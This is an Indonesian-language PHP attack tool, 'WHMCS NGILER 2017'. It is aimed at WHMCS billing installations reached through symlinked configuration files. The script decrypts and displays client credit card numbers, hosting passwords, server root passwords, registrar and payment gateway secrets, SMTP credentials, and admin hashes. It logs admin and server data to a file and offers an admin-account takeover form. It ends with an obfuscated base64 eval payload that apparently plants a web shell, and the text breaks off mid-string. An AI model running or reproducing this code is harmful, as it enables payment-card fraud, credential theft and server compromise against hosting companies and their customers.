
<center><form method="post"><div style="text-align: center;"><div><div style="margin: 5px;"><div class="smallfont" style="margin-bottom: 1px;"><input onclick="if (this.parentNode.parentNode.getElementsByTagName('div')[1].getElementsByTagName('div')[0].style.display != '') { this.parentNode.parentNode.getElementsByTagName('div')[1].getElementsByTagName('div')[0].style.display = ''; this.innerText = ''; this.value = 'Tutup'; } else { this.parentNode.parentNode.getElementsByTagName('div')[1].getElementsByTagName('div')[0].style.display = 'none'; this.innerText = ''; this.value = 'Tutorial'; }" style="font-size: 14px; margin: 0px; padding: 0px; width: 250px;" type="button" value="WHMCS NGILER 2017" /></div><div class="alt2" style="border: 0px inset; margin: 0px; padding: 6px;"><div style="display: none;">
<div style="background-color:#000; -moz-border-radius:5px; border:1px solid #000; padding:10px;">
<center>
<table style="height: 149px;" width="700">
<tbody>
<tr>
<td><span style="background-color: #000000; color: #00ff00;">Masukan config didalam form</span></td>
</tr>
<tr>
<td><span style="background-color: #000000; color: #00ff00;">Contoh:</span></td>
</tr>
<tr>
<td><span style="background-color: #000000; color: #00ff00;">configuration.php &lt;--- jadi script WHMCS NGILER ini harus di taruh di public_html</span></td>
</tr>
<tr>
<td><span style="background-color: #000000; color: #00ff00;">Hasil-Symlink.txt &lt;--- jadi script WHMCS NGILER ini harus di taruh di lokasi folder hasil symlink</span></td>
</tr>
<tr>
<td><span style="background-color: #000000; color: #00ff00;">atau juga bisa begini</span></td>
</tr>
<tr>
<td><span style="background-color: #000000; color: #00ff00;">/home/anu/public_html/anu/configuration.php</span></td>
</tr>
<tr>
<td><span style="background-color: #000000; color: #00ff00;">Kalau sudah langsung aja coliin </span></td>
</tr>
</tbody>
</table>
</div>
</center>
</div></div></div></div></div>
<center>
<input type="text" size="30" name="anune" value="<?php echo $_POST['anune']; ?>" />
<input name="anu" type="submit" value=" Coliin Dulu" id="button"/>
<br>
<?php
// CHANGE ADMIN WHMCS
if(isset($_POST['anu'])) {
$anune = $_POST['anune'];
require("$anune");
echo "<br><div style=\"text-align: center;\"><div><div style=\"margin: 5px;\"><div class=\"smallfont\" style=\"margin-bottom: 1px;\"><input onclick=\"if (this.parentNode.parentNode.getElementsByTagName('div')[1].getElementsByTagName('div')[0].style.display != '') { this.parentNode.parentNode.getElementsByTagName('div')[1].getElementsByTagName('div')[0].style.display = ''; this.innerText = ''; this.value = 'Tutup'; } else { this.parentNode.parentNode.getElementsByTagName('div')[1].getElementsByTagName('div')[0].style.display = 'none'; this.innerText = ''; this.value = 'CHANGE ADMIN WHMCS'; }\" style=\"font-size: 14px; margin: 0px; padding: 0px; width: 250px;\" type=\"button\" value=\"CHANGE ADMIN WHMCS\" /></div>
<div class=\"alt2\" style=\"border: 0px inset; margin: 0px; padding: 6px;\"><div style=\"display: none;\">"; 
echo "<div style=\"background-color:#ccc; -moz-border-radius:5px; border:1px solid #000; padding:10px;\">"; 
echo "<style=\"color:lime;\"> <p>Target ID Admin<br/>"; 
echo "<input value=\"1\" type=\"text\" name=\"iduser\" size=\"20\"><br/>"; 
echo "Nama Depan<br/>"; 
echo "<input value=\"HsH\" type=\"text\" name=\"firstname\" size=\"20\"><br/>"; 
echo "Nama Belakang<br/>"; 
echo "<input value=\"1337\" type=\"text\" name=\"lastname\" size=\"20\"><br/>"; 
echo "Admin Login<br/>"; 
echo "<input value=\"HsH 1337\" type=\"text\" name=\"userbaru\" size=\"20\"><br/>"; 
echo "Email Login<br/>"; 
echo "<input value=\"contact.suports@gmail.com\" type=\"text\" name=\"emailbaru\" size=\"20\"><br/>"; 
echo "Password Login <br/>"; 
echo "<input value=\"@~HsH1337*@(:P)\" type=\"password\" name=\"passbaru\" size=\"20\"><br/>"; 
echo "<p><input name=\"hajar\" type=\"submit\" style=\"color:lime;background-color:#000000\" value=\" Sikat Admin \" ></form>"; 
echo "<p> ";
echo "</div></div></div></div></div></div>";
@mysql_connect($db_host,$db_username,$db_password);
@mysql_select_db($db_name);

function cut($start,$end,$top){
$c =strlen($start);
$desc= strstr("$top","$start");
$count = strpos("$desc","$end");
$desc = substr($desc,$c,$count-$c);
return $desc;
}

function dec($string,$cc_encryption_hash){
$key = md5(md5($cc_encryption_hash)) . md5($cc_encryption_hash);
$hash_key = _hash($key);
$hash_length = strlen($hash_key);
$string = base64_decode($string);
$tmp_iv = substr($string,0,$hash_length);
$string = substr($string,$hash_length,strlen ($string) - $hash_length);
$iv = $out = '';
$c = 0;
while ($c < $hash_length){
$iv .= chr(ord($tmp_iv[$c]) ^ ord($hash_key[$c]));
++$c;
}
$key = $iv;
$c = 0;
while ($c < strlen($string)){
if(($c != 0 AND $c % $hash_length == 0)){
$key = _hash($key . substr($out,$c - $hash_length,$hash_length));
}
$out .= chr(ord($key[$c % $hash_length]) ^ ord ($string[$c]));
++$c;
}
return $out;
}


function _hash($string){
if(function_exists("sha1")) {
$hash = sha1($string);
} else {
$hash = md5($string);
}
$out = "";
$c  = 0;
while ($c < strlen($hash)) {
$out .= chr(hexdec($hash[$c] . $hash[$c + 1]));
$c += 2;
}
return $out;
}


// PAYPAL + SMTP 
echo "<div style=\"text-align: center;\"><div><div style=\"margin: 5px;\"><div class=\"smallfont\" style=\"margin-bottom: 1px;\"><input onclick=\"if (this.parentNode.parentNode.getElementsByTagName('div')[1].getElementsByTagName('div')[0].style.display != '') { this.parentNode.parentNode.getElementsByTagName('div')[1].getElementsByTagName('div')[0].style.display = ''; this.innerText = ''; this.value = 'Tutup'; } else { this.parentNode.parentNode.getElementsByTagName('div')[1].getElementsByTagName('div')[0].style.display = 'none'; this.innerText = ''; this.value = 'PAYPAL + SMTP'; }\" style=\"font-size: 14px; margin: 0px; padding: 0px; width: 250px;\" type=\"button\" value=\"PAYPAL + SMTP\" /></div>
<div class=\"alt2\" style=\"border: 0px inset; margin: 0px; padding: 6px;\"><div style=\"display: none;\">
<div style=\"background-color:#ccc; -moz-border-radius:5px; border:1px solid #000; padding:10px;\">
<table border='1' cellpadding='5' align='center'>";

$query0=mysql_query("SELECT * FROM tblemailtemplates where name='Client Signup Email' or name='Password Reset Confirmation'");

while($v0=mysql_fetch_array($query0))

{

$t=$v0['subject'];

$t=trim(str_replace('{$company_name}','',$t));

$c=$v0['message'];

$c=explode("\n",$c);

$r="";

for ($i=0;$i<count($c);$i++) {

if(strpos($c[$i],'{$client_password}')>0) {

$r.= $c[$i];

}elseif(strpos($c[$i],'{$client_email}')>0) {

$r.= $c[$i];

}

}

$r=preg_quote($r);

$r=str_replace('\{\$client_email\}','(.*)',$r);

$r=str_replace('\{\$client_password\}','(.*)',$r);

$r=str_replace('\{\$whmcs_link\}','(.*)',$r);

$r=str_replace('\{\$signature\}','(.*)',$r);

$r=str_replace('\{\$client_name\}','(.*)',$r);

$r=str_replace("\n","",$r);

$r=str_replace("\r","",$r);

$query=mysql_query("SELECT message,userid FROM tblemails where subject like '%".$t."%'");

while($v=mysql_fetch_array($query))

{

$mail=$v['message'];

$mail=str_replace("\n","",$mail);

$mail=str_replace("\r","",$mail);

// echo $mail;

	$reg  = "|(.*)$r(.*)|isU";

	// echo $reg;

$a=array();

preg_match_all($reg,($mail),$a);

for ($i=1;$i<count($a);$i++){

if( eregi("^[_\.0-9a-z-]+@([0-9a-z-]+\.)+[a-z]{2,10}$",$a[$i][0]) ) {

$list[$v['userid']]['mail'][]=$a[$i][0];

$list[$v['userid']]['pass'][]=$a[$i+1][0];

}

}

}

 

}

echo("<h3  class=\"tit\">Total Records ".(count($list)-1)."</h3>");

echo "<table border='1'>";

foreach ($list as $x=>$y){

echo "<tr><td><a href='?p=12&id=</a></td><td>".implode("<br>",$y['mail'])."|".implode("<br>",$y['pass'])."</td></tr>";

}

echo "</table>";

echo "<center><h1>smtp</h1>";

	

$query = mysql_query("SELECT * FROM tblconfiguration where 1");



        echo "<table border='1' cellpadding='5' align='center'>";



            while($row = mysql_fetch_array($query)){



                  if($row[setting] == 'SMTPHost'){

                        echo  "<tr><td>Hostname</td><td>{$row[value]}</td></tr>";

                  }elseif($row[setting] == 'SMTPUsername'){

                        echo  "<tr><td>Username</td><td>{$row[value]}</td></tr>";

                  }elseif($row[setting] == 'SMTPPassword'){

                        echo  "<tr><td>Password</td><td>{$row[value]}</td></tr>";

                  }elseif($row[setting] == 'SMTPPort'){

                        echo  "<tr><td>Port</td><td>{$row[value]}</td></tr>";

                  }

            }



        echo "</table></div></div></div></div></div></div>";

// WHMCS ADMIN 
$query = mysql_query("SELECT * FROM tbladmins"); 
echo "<div style=\"text-align: center;\"><div><div style=\"margin: 5px;\"><div class=\"smallfont\" style=\"margin-bottom: 1px;\"><input onclick=\"if (this.parentNode.parentNode.getElementsByTagName('div')[1].getElementsByTagName('div')[0].style.display != '') { this.parentNode.parentNode.getElementsByTagName('div')[1].getElementsByTagName('div')[0].style.display = ''; this.innerText = ''; this.value = 'Tutup'; } else { this.parentNode.parentNode.getElementsByTagName('div')[1].getElementsByTagName('div')[0].style.display = 'none'; this.innerText = ''; this.value = 'WHMCS ADMIN'; }\" style=\"font-size: 14px; margin: 0px; padding: 0px; width: 250px;\" type=\"button\" value=\"WHMCS ADMIN\" /></div>
<div class=\"alt2\" style=\"border: 0px inset; margin: 0px; padding: 6px;\"><div style=\"display: none;\">
<div style=\"background-color:#ccc; -moz-border-radius:5px; border:1px solid #000; padding:10px;\">
<table border='1' cellpadding='5' align='center'>
<tr> <td align='center'><b> <font color='blue'> ID</font></b></td>
<td align='center'><b> <font color='blue'> EMAIL </font></b></td>
<td align='center'><b> <font color='blue'> USERNAME</font></b></td>
<td align='center'><b> <font color='blue'> PASSWORD</font></b></td>
</tr>";
        
while($v = mysql_fetch_array($query)) { 
$catet = fopen("data.txt","a");
echo "<tr>
<td align='center'> <font color='green'> {$v['id']}</font></td>
<td align='center'> <font color='green'> {$v['email']}</font></td>
<td align='center'> <font color='green'> {$v['username']}</font></td>
<td align='center'> <font color='green'> {$v['password']}</font></td>
</tr>";
$id = $v['id'];
$email = $v['email'];
$user = $v['username'];
$pass = $v['password'];
fwrite($catet, "
");
fwrite($catet, "        --========== Data Admin ==========-- ");
fwrite($catet, "
");
fwrite($catet,"Id: $id "); 
fwrite($catet, "
");
fwrite($catet,"Email: $email "); 
fwrite($catet, "
");
fwrite($catet,"Username: $user "); 
fwrite($catet, "
");
fwrite($catet,"Password: $pass "); 
fwrite($catet, "
");
fwrite($catet, "
");
fwrite($catet, "1239477");
fwrite($catet, "
");
fwrite($catet, "
");
fclose($catet); 
}
echo "</table></div></div></div></div></div></div>"; 

//HOST ROOT
$query = mysql_query("SELECT *FROM tblservers");
echo "<div style=\"text-align: center;\"><div><div style=\"margin: 5px;\"><div class=\"smallfont\" style=\"margin-bottom: 1px;\"><input onclick=\"if (this.parentNode.parentNode.getElementsByTagName('div')[1].getElementsByTagName('div')[0].style.display != '') { this.parentNode.parentNode.getElementsByTagName('div')[1].getElementsByTagName('div')[0].style.display = ''; this.innerText = ''; this.value = 'Tutup'; } else { this.parentNode.parentNode.getElementsByTagName('div')[1].getElementsByTagName('div')[0].style.display = 'none'; this.innerText = ''; this.value = 'HOST ROOT'; }\" style=\"font-size: 14px; margin: 0px; padding: 0px; width: 250px;\" type=\"button\" value=\"HOST ROOT\" /></div>
<div class=\"alt2\" style=\"border: 0px inset; margin: 0px; padding: 6px;\"><div style=\"display: none;\">
<div style=\"background-color:#ccc; -moz-border-radius:5px; border:1px solid #000; padding:10px;\">
<table border='1' cellpadding='5' align='center'>
<tr> <td align='center'><b> <font color='blue'> TYPE</font></b></td>
<td align='center'><b> <font color='blue'> ACTIVE </font></b></td>
<td align='center'><b> <font color='blue'> IP ADDRESS</font></b></td>
<td align='center'><b> <font color='blue'> USERNAME</font></b></td>
<td align='center'><b> <font color='blue'> PASSWORD</font></b></td>
<td align='center'><b> <font color='blue'>ACCESS HASH</font></b></td> 
<td align='center'><b> <font color='blue'>NAME SERVER</font></b> 
</tr>";
        
while($v = mysql_fetch_array($query)) {
$catet = fopen("data.txt","a");
echo "<tr>
<td align='center'> <font color='green'> {$v['type']}</font></td>
<td align='center'> <font color='green'> {$v['active']}</font></td>
<td align='center'> <font color='green'> {$v['ipaddress']}</font></td>
<td> <font color='green'> {$v['username']}</font></td>
<td> <font color='green'> ".dec($v['password'],$cc_encryption_hash)."</font></td>
<td> <textarea rows=10 cols=30>{$v['accesshash']}</textarea></td> 
<td> <font color='green'> {$v['nameserver1']}</font></td>
</tr>";
$type = $v['type'];
$aktif = $v['active'];
$ip = $v['ipaddress'];
$user = $v['username'];
$hash = $v['accesshash'];
fwrite($catet, "
");
fwrite($catet, "        --========== Data server ==========-- ");
fwrite($catet, "
");
fwrite($catet, "
");
fwrite($catet,"type: $type "); 
fwrite($catet, "
");
fwrite($catet,"status: $aktif "); 
fwrite($catet, "
");
fwrite($catet,"ip: $ip "); 
fwrite($catet, "
");
fwrite($catet,"admin: $user "); 
fwrite($catet, "
");
fwrite($catet,"$hash"); 
fwrite($catet, "
");
fwrite($catet, "
");
fwrite($catet, "1239477");
fwrite($catet, "
");
fwrite($catet, "
");
fclose($catet); 
}
echo "</table></div></div></div></div></div></div>"; 

// DOMAIN REGISTRARS
$query = mysql_query("SELECT *FROM tblregistrars");
echo "<div style=\"text-align: center;\"><div><div style=\"margin: 5px;\"><div class=\"smallfont\" style=\"margin-bottom: 1px;\"><input onclick=\"if (this.parentNode.parentNode.getElementsByTagName('div')[1].getElementsByTagName('div')[0].style.display != '') { this.parentNode.parentNode.getElementsByTagName('div')[1].getElementsByTagName('div')[0].style.display = ''; this.innerText = ''; this.value = 'Tutup'; } else { this.parentNode.parentNode.getElementsByTagName('div')[1].getElementsByTagName('div')[0].style.display = 'none'; this.innerText = ''; this.value = 'DOMAIN REGISTRERS'; }\" style=\"font-size: 14px; margin: 0px; padding: 0px; width: 250px;\" type=\"button\" value=\"DOMAIN REGISTRERS\" /></div>
<div class=\"alt2\" style=\"border: 0px inset; margin: 0px; padding: 6px;\"><div style=\"display: none;\">
<div style=\"background-color:#ccc; -moz-border-radius:5px; border:1px solid #000; padding:10px;\">
<table border='1' align='center' cellpadding='5'>
<tr> <td align='center'><b> <font color='blue'> REGISTRAR</font></b></td>
<td align='center'><b> <font color='blue'> SETTING</font></b></td>
<td align='center'><b> <font color='blue'> VALUE</font> </b></td></tr>";
while($v = mysql_fetch_array($query)){
$value = (!dec($v['value'],$cc_encryption_hash)) ? "0":dec($v['value'],$cc_encryption_hash);
echo "<tr>
<td align='center'> <font color='green'> {$v['registrar']}</font></td>
<td align='center'> <font color='green'> {$v['setting']}</font></td>
<td align='center'> <font color='green'> $value</font></td></tr>" ;
}
echo "</table></div></div></div></div></div></div>"; 


// PAYMENT GETWAY
$query = mysql_query("SELECT *FROM tblpaymentgateways");
echo "<div style=\"text-align: center;\"><div><div style=\"margin: 5px;\"><div class=\"smallfont\" style=\"margin-bottom: 1px;\"><input onclick=\"if (this.parentNode.parentNode.getElementsByTagName('div')[1].getElementsByTagName('div')[0].style.display != '') { this.parentNode.parentNode.getElementsByTagName('div')[1].getElementsByTagName('div')[0].style.display = ''; this.innerText = ''; this.value = 'Tutup'; } else { this.parentNode.parentNode.getElementsByTagName('div')[1].getElementsByTagName('div')[0].style.display = 'none'; this.innerText = ''; this.value = 'PAYMENT GETWAY'; }\" style=\"font-size: 14px; margin: 0px; padding: 0px; width: 250px;\" type=\"button\" value=\"PAYMENT GETWAY\" /></div>
<div class=\"alt2\" style=\"border: 0px inset; margin: 0px; padding: 6px;\"><div style=\"display: none;\">
<div style=\"background-color:#ccc; -moz-border-radius:5px; border:1px solid #000; padding:10px;\">
<table border='1' align='center' cellpadding='5'>
<tr> <td align='center'><b> <font color='blue'> GATEWAY</font></b></td>
<td align='center'><b> <font color='blue'> SETTING </font></b></td>
<td align='center'><b> <font color='blue'> VALUE </font></b></td>
<td align='center'><b> <font color='blue'> ORDER </font></b></td></tr>";
while($v = mysql_fetch_array($query)){
echo "<tr>
<td align='center'> <font color='green'> {$v['gateway']}</font></td>
<td align='center'> <font color='green'> {$v['setting']}</font></td>
<td align='center'> <font color='green'> {$v['value']}</font></td>
<td align='center'> <font color='green'> {$v['order']}</font></td> </tr>" ;
}
echo "</table></div></div></div></div></div></div>"; 



// CLIENT CC
$query = mysql_query("SELECT id FROM tblclients WHERE issuenumber != '' ORDER BY id DESC"); 
echo "<div style=\"text-align: center;\"><div><div style=\"margin: 5px;\"><div class=\"smallfont\" style=\"margin-bottom: 1px;\"><input onclick=\"if (this.parentNode.parentNode.getElementsByTagName('div')[1].getElementsByTagName('div')[0].style.display != '') { this.parentNode.parentNode.getElementsByTagName('div')[1].getElementsByTagName('div')[0].style.display = ''; this.innerText = ''; this.value = 'Tutup'; } else { this.parentNode.parentNode.getElementsByTagName('div')[1].getElementsByTagName('div')[0].style.display = 'none'; this.innerText = ''; this.value = 'CLIENT CC'; }\" style=\"font-size: 14px; margin: 0px; padding: 0px; width: 250px;\" type=\"button\" value=\"CLIENT CC\" /></div>
<div class=\"alt2\" style=\"border: 0px inset; margin: 0px; padding: 6px;\"><div style=\"display: none;\">
<div style=\"background-color:#ccc; -moz-border-radius:5px; border:1px solid #000; padding:10px;\">
<table border='1' cellpadding='5' align='center'>
<tr><td align='center'><b> <font color='blue'>CardType</font></b></td>
<td align='center'><b><font color='blue'>CardNumb </font></b></td>
<td align='center'><b> <font color='blue'>Expdate</font></b></td>
<td align='center'><b> <font color='blue'>IssueNumber</font></b></td>
<td align='center'><b> <font color='blue'>FirstName</font></b></td>
<td align='center'><b> <font color='blue'>LastName</font></b></td>
<td align='center'><b><font color='blue'>Address</font></b></td>
<td align='center'><b> <font color='blue'>Country</font></b></td> 
<td align='center'><b> <font color='blue'>Phone</font></b></td>
<td align='center'><b> <font color='blue'>Email</font></b></td> 
</tr>";
while($v = mysql_fetch_array($query)) { 
$cchash = md5($cc_encryption_hash.$v['0']);
$s = mysql_query("SELECT firstname,lastname,address1,country,phonenumber,cardtype,email,AES_DECRYPT(cardnum,'" . $cchash . "') as cardnum,AES_DECRYPT(expdate,'" . $cchash . "') as expdate,AES_DECRYPT(issuenumber,'" . $cchash . "') as issuenumber FROM tblclients WHERE id='".$v['0']."'");
$v2=mysql_fetch_array($s); 
echo "<tr>
<td align='center'> <font color='green'> ".$v2['cardtype']."</font></td>
<td align='center'> <font color='green'> ".$v2['cardnum']." </font> </td>
<td align='center'> <font color='green'> ".$v2['expdate']." </font> </td>
<td align='center'> <font color='green'> ".$v2['issuenumber']." </font> </td>
<td align='center'> <font color='green'> ".$v2['firstname']." </font> </td>
<td align='center'> <font color='green'> ".$v2['lastname']." </font> </td>
<td align='center'> <font color='green'> ".$v2['address1']." </font> </td>
<td align='center'> <font color='green'> ".$v2['country']." </font> </td> 
<td align='center'> <font color='green'> ".$v2['phonenumber']." </font> </td>
<td align='center'>".$v2['email']." </font> </td></tr>";
}
echo "</table></div></div></div></div></div></div>";


// CLIENT HOSTING ACCOUNT
$query = mysql_query("SELECT *FROM tblhosting");
echo "<div style=\"text-align: center;\"><div><div style=\"margin: 5px;\"><div class=\"smallfont\" style=\"margin-bottom: 1px;\"><input onclick=\"if (this.parentNode.parentNode.getElementsByTagName('div')[1].getElementsByTagName('div')[0].style.display != '') { this.parentNode.parentNode.getElementsByTagName('div')[1].getElementsByTagName('div')[0].style.display = ''; this.innerText = ''; this.value = 'Tutup'; } else { this.parentNode.parentNode.getElementsByTagName('div')[1].getElementsByTagName('div')[0].style.display = 'none'; this.innerText = ''; this.value = 'CLIENT HOSTING ACCOUNT'; }\" style=\"font-size: 14px; margin: 0px; padding: 0px; width: 250px;\" type=\"button\" value=\"CLIENT HOSTING ACCOUNT\" /></div>
<div class=\"alt2\" style=\"border: 0px inset; margin: 0px; padding: 6px;\"><div style=\"display: none;\">
<div style=\"background-color:#ccc; -moz-border-radius:5px; border:1px solid #000; padding:10px;\">
<table border='1' cellpadding='5' align='center'>
<tr><td align='center'><b> <font color='blue'> DOMAIN</font></b></td>
<td align='center'><b> <font color='blue'> USERNAME</font></b></td>
<td align='center'><b> <font color='blue'> PASSWORD</font></b></td>
<td align='center'><b> <font color='blue'> IP ADDRESS</font></b></td></tr>";
while($v = mysql_fetch_array($query)){
echo "<tr>
<td align='center'> <font color='green'> {$v['domain']}</font></td>
<td align='center'> <font color='green'> {$v['username']}</font></td>
<td align='center'> <font color='green'> ".dec($v['password'],$cc_encryption_hash)."</font></td>
<td align='center'> <font color='green'> {$v['assignedips']}</font></td></tr>";
}
echo "</table><br /><br />";
}
$hell = "{php}eval(base64_decode('JGMwZGUgID0gYmFzZTY0X2RlY29kZSgnUjBsR09EbGhVRHM4Y0NCaGJHbG5iajBpWTJWdWRHVnlJajROQ2cwS1BEOXdhSEFOQ21WeWNtOXlYM0psY0c5eWRHbHVaeWd3S1RzTkNpUnpZM0pwY0hSdVlXMWxJRDBnSkY5VFJWSldSVkpiSjFORFVrbFFWRjlPUVUxRkoxMDdEUW9rWm1sc1pXNWhiV1VnUFNBa1gxQlBVMVJiSW1acGJHVnVZVzFsSWwwN0RRcHBaaWdrWDFCUFUxUmJJbk4xWW0xcGRDSmRJRDA5SUNKUGNHVnVJaWtOQ25zTkNtbG1LR1pwYkdWZlpYaHBjM1J6S0NSbWFXeGxibUZ0WlNrcERRcDdEUW9rWm1sc1pXTnZiblJsYm5SeklEMGdhSFJ0YkdWdWRHbDBhV1Z6S0dacGJHVmZaMlYwWDJOdmJuUmxiblJ6S0NSbWFXeGxibUZ0WlNrcE93MEthV1lvSVNSbWFXeGxZMjl1ZEdWdWRITXBEUW9rYzNSaGRIVnpJRDBnSWp4bWIyNTBJR1poWTJVOUoxWmxjbVJoYm1FbklITjBlV3hsUFNkbWIyNTBMWE5wZW1VNklEaHdkQ2MrUlhKeWIzSWdUbTkwYUdsdVp5QkdhV3hsUEM5bWIyNTBQaUk3RFFwOURRcGxiSE5sRFFva2MzUmhkSFZ6SUQwZ0lqeG1iMjUwSUdaaFkyVTlKMVpsY21SaGJtRW5JSE4wZVd4bFBTZG1iMjUwTFhOcGVtVTZJRGh3ZENjK1JtbHNaU0JrYjJWeklHNXZkQ0JsZUdsemRDRThMMlp2Ym5RK0lqc05DbjBKQ1EwS1pXeHpaU0JwWmlna1gxQlBVMVJiSW5OMVltMXBkQ0pkSUQwOUlDSkVaV3hsZEdVaUtRMEtldzBLYVdZb1ptbHNaVjlsZUdsemRITW9KR1pwYkdWdVlXMWxLU2tOQ25zTkNtbG1LSFZ1YkdsdWF5Z2tabWxzWlc1aGJXVXBLUWtOQ2lSemRHRjBkWE1nUFNBaVBHWnZiblFnWm1GalpUMG5WbVZ5WkdGdVlTY2djM1I1YkdVOUoyWnZiblF0YzJsNlpUb2dPSEIwSno1R2FXeGxJSE4xWTJObGMzTm1kV3hzZVNCa1pXeGxkR1ZrSVR3dlptOXVkRDRpT3cwS1pXeHpaUTBLSkhOMFlYUjFjeUE5SUNJOFptOXVkQ0JtWVdObFBTZFdaWEprWVc1aEp5QnpkSGxzWlQwblptOXVkQzF6YVhwbE9pQTRjSFFuUGtOdmRXeGtJRzV2ZENCa1pXeGxkR1VnWm1sc1pTRThMMlp2Ym5RK0lqc05DbjBOQ21Wc2MyVU5DaVJ6ZEdGMGRYTWdQU0FpUEdadmJuUWdabUZqWlQwblZtVnlaR0Z1WVNjZ2MzUjViR1U5SjJadmJuUXRjMmw2WlRvZ09IQjBKejVHYVd4bElHUnZaWE1nYm05MElHVjRhWE4wSVR3dlptOXVkRDRpT3cwS2ZRMEtaV3h6WlNCcFppZ2tYMUJQVTFSYkluTjFZbTFwZENKZElEMDlJQ0pUWVhabElpa05DbnNOQ2lSbWFXeGxZMjl1ZEdWdWRITWdQU0J6ZEhKcGNITnNZWE5vWlhNb2FIUnRiRjlsYm5ScGRIbGZaR1ZqYjJSbEtDUmZVRTlUVkZzaVkyOXVkR1Z1ZEhNaVhTa3BPdzBLYVdZb1ptbHNaVjlsZUdsemRITW9KR1pwYkdWdVlXMWxLU2tOQ25WdWJHbHVheWdrWm1sc1pXNWhiV1VwT3cwS0pHaGhibVJzWlNBOUlHWnZjR1Z1S0NSbWFXeGxibUZ0WlN3Z0luY2lLVHNOQ21sbUtDRWthR0Z1Wkd4bEtRMEtKSE4wWVhSMWN5QTlJQ0k4Wm05dWRDQm1ZV05sUFNkV1pYSmtZVzVoSnlCemRIbHNaVDBuWm05dWRDMXphWHBsT2lBNGNIUW5Qa052ZFd4a0lHNXZkQ0J2Y0dWdUlHWnBiR1VnWm05eUlIZHlhWFJsSUdGalkyVnpjeUVnUEM5bWIyNTBQaUk3RFFwbGJITmxEUXA3RFFwcFppZ2habmR5YVhSbEtDUm9ZVzVrYkdVc0lDUm1hV3hsWTI5dWRHVnVkSE1wS1EwS0pITjBZWFIxY3lBOUlDUnpkR0YwZFhNdUlqeG1iMjUwSUdaaFkyVTlKMVpsY21SaGJtRW5JSE4wZVd4bFBTZG1iMjUwTFhOcGVtVTZJRGh3ZENjK1EyOTFiR1FnYm05MElIZHlhWFJsSUhSdklHWnBiR1VoSUNoTllYbGlaU0I1YjNVZ1pHbGtiaWQwSUdWdWRHVnlJR0Z1ZVNCMFpYaDBQeWs4TDJadmJuUStJanNOQ21aamJHOXpaU2drYUdGdVpHeGxLVHNOQ24wTkNpUm1hV3hsWTI5dWRHVnVkSE1nUFNCb2RHMXNaVzUwYVhScFpYTW9KR1pwYkdWamIyNTBaVzUwY3lrN0RRcDlEUXBsYkhObERRcDdEUW9rYzNSaGRIVnpJRDBnSWp4bWIyNTBJR1poWTJVOUoxWmxjbVJoYm1FbklITjBlV3hsUFNkbWIyNTBMWE5wZW1VNklEaHdkQ2MrVG04Z1ptbHNaU0JzYjJGa1pXUWhQQzltYjI1MFBpSTdEUXA5RFFvL1BnMEtQSFJoWW14bElHSnZjbVJsY2owaU1DSWdZV3hwWjI0OUltTmxiblJsY2lJK1BIUnlQangwWkQ0OGRHRmliR1VnZDJsa2RHZzlJakV3TUNVaUlHSnZjbVJsY2owaU1DSStQSFJ5UGp4MFpENE5DanhtYjNKdElHMWxkR2h2WkQwaWNHOXpkQ0lnWVdOMGFXOXVQU0k4UDBWamFHOGdKSE5qY21sd2RHNWhiV1U3UHo0aVBnMEtQR2x1Y0hWMElITjBlV3hsUFNKamIyeHZjanBzYVcxbE8ySmhZMnRuY205MWJtUXRZMjlzYjNJNkl6QXdNREF3TUNJZ2JtRnRaVDBpWm1sc1pXNWhiV1VpSUhSNWNHVTlJblJsZUhRaUlIWmhiSFZsUFNJOFAwVmphRzhnSkdacGJHVnVZVzFsT3o4K0lpQnphWHBsUFNJM01pSStEUW84YVc1d2RYUWdkSGx3WlQwaWMzVmliV2wwSWlCemRIbHNaVDBpWTI5c2IzSTZiR2x0WlR0aVlXTnJaM0p2ZFc1a0xXTnZiRzl5T2lNd01EQXdNREFpSUc1aGJXVTlJbk4xWW0xcGRDSWdkbUZzZFdVOUlrOXdaVzRpUGcwS1BHbHVjSFYwSUhSNWNHVTlJbk4xWW0xcGRDSWdjM1I1YkdVOUltTnZiRzl5T214cGJXVTdZbUZqYTJkeWIzVnVaQzFqYjJ4dmNqb2pNREF3TURBd0lpQnVZVzFsUFNKemRXSnRhWFFpSUhaaGJIVmxQU0pFWld4bGRHVWlQand2ZEdRK1BDOTBjajQ4TDNSaFlteGxQZzBLUEdadmJuUWdabUZqWlQwaVZtVnlaR0Z1WVNJZ2MzUjViR1U5SW1admJuUXRjMmw2WlRvZ01URndkQ0krRFFvOGRHVjRkR0Z5WldFZ2JtRnRaVDBpWTI5dWRHVnVkSE1pSUhOMGVXeGxQU0pqYjJ4dmNqcHNhVzFsTzJKaFkydG5jbTkxYm1RdFkyOXNiM0k2SXpBd01EQXdNQ0lnWTI5c2N6MGlOekFpSUhKdmQzTTlJakkxSWo0TkNqdy9SV05vYnlBa1ptbHNaV052Ym5SbGJuUnpPejgrUEM5MFpYaDBZWEpsWVQ0OEwyWnZiblErUEdKeVBnMEtQR2x1Y0hWMElIUjVjR1U5SW5OMVltMXBkQ0lnYzNSNWJHVTlJbU52Ykc5eU9teHBiV1U3WW1GamEyZHliM1Z1WkMxamIyeHZjam9qTURBd01EQXdJaUJ1WVcxbFBTSnpkV0p0YVhRaUlIWmhiSFZsUFNKVFlYWmxJajROQ2p4cGJuQjFkQ0IwZVhCbFBTSnlaWE5sZENJZ2MzUjViR1U5SW1OdmJHOXlPbXhwYldVN1ltRmphMmR5YjNWdVpDMWpiMnh2Y2pvak1EQXdNREF3SWlCMllXeDFaVDBpVW1WelpYUWlQZzBLUEM5bWIzSnRQZzBLUEhBK0RRbzhhRE0rWDFWUVRFOUJSQ0JHU1V4Rlh6eG9NejROQ2cwS1BEOXdhSEFOQ2cwS1pXTm9ieUFuUEdadmNtMGdZV04wYVc5dVBTSWlJRzFsZEdodlpEMGljRzl6ZENJZ1pXNWpkSGx3WlQwaWJYVnNkR2x3WVhKMEwyWnZjbTB0WkdGMFlTSWdibUZ0WlQwaWRYQnNiMkZrWlhJaUlHbGtQU0oxY0d4dllXUmxjaUkrSnpzTkNnMEtaV05vYnlBblVFRlVTQ0JVUVZKSFJWUWdPaUE4YVc1d2RYUWdibUZ0WlQwaWRYQnNiMkZrZEc4aUlITjBlV3hsUFNKamIyeHZjanBzYVcxbE8ySmhZMnRuY205MWJtUXRZMjlzYjNJNkl6QXdNREF3TUNJZ2RIbHdaVDBpZEdWNGRDSWdjMmw2WlQwaU5UQWlJSFpoYkhWbFBTSW5MbWRsZEdOM1pDZ3BMaWNpUGp4aWNpQXZQaWM3RFFwbFkyaHZJQ2M4YVc1d2RYUWdkSGx3WlQwaVptbHNaU0lnYzNSNWJHVTlJbU52Ykc5eU9teHBiV1U3WW1